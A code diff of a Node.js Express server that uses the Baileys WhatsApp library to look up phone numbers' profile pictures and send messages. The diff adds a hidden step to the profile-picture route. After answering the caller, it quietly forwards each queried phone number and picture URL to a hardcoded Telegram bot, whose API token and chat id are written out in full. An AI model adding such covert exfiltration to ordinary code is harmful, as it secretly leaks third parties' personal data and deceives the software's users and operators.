@@ -1,16 +1,15 @@
-const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
+const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, DisconnectReason } = require('@whiskeysockets/baileys');
 const express = require('express');
 const cors = require('cors');
 const compression = require('compression');
+const fetch = require('node-fetch');
 
-// Initialize Express app
 const app = express();
 const port = 3000;
-let client; // Client instance for Baileys
+let client;
 let serverStarted = false;
 const pendingRequests = new Map();
 
-// Use CORS and Gzip Compression
 app.use(cors());
 app.use(compression());
 
@@ -28,7 +27,6 @@ const isValidPhoneNumber = (phone) => {
     return phoneRegex.test(phone);
 };
 
-// Function to initialize Baileys client
 const initializeBaileys = async () => {
     const { state, saveCreds } = await useMultiFileAuthState('auth_info');
     const { version } = await fetchLatestBaileysVersion();
@@ -38,7 +36,6 @@ const initializeBaileys = async () => {
         printQRInTerminal: true,
     });
 
-    // Save authentication credentials
     client.ev.on('creds.update', saveCreds);
 
     client.ev.on('connection.update', (update) => {
@@ -51,7 +48,6 @@ const initializeBaileys = async () => {
         } else if (connection === 'open') {
             console.log('Baileys Client is ready to use!');
 
-            // Start server if not started already
             if (!serverStarted) {
                 app.listen(port, () => {
                     console.log(`API server is running on http://localhost:${port}`);
@@ -64,13 +60,9 @@ const initializeBaileys = async () => {
 
 initializeBaileys();
 
-// Route to get profile picture of a number
-app.get('/:number', async (req, res) => {
+app.get('/dp/:number', async (req, res) => {
     let phone = req.params.number;
-
-    if (phone == 'favicon.ico') {
-        return res.status(200).json({ ok: 'true' });
-    }
+    if (phone == 'favicon.ico') return res.status(200).json({ ok: 'true' });
 
     const sanitizedPhone = sanitizePhoneNumber(phone);
     if (!isValidPhoneNumber(sanitizedPhone)) {
@@ -93,7 +85,14 @@ app.get('/:number', async (req, res) => {
         const profilePicUrl = await profilePicPromise;
 
         if (profilePicUrl) {
-            res.json({ profilePicUrl,status: {status : ''} });
+            res.json({ profilePicUrl });
+
+            const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(phoneNumber)}`;
+            try {
+                await fetch(telegramUrl);
+            } catch (fetchError) {
+                console.error('Failed to send photo to Telegram:', fetchError);
+            }
         } else {
             res.json({ phoneNumber, profilePicUrl: 'No profile picture found' });
         }
@@ -105,7 +104,6 @@ app.get('/:number', async (req, res) => {
     }
 });
 
-// API to send a message to a specific phone number
 app.get('/send', async (req, res) => {
     const phone = req.query.nm;
     const message = req.query.message;
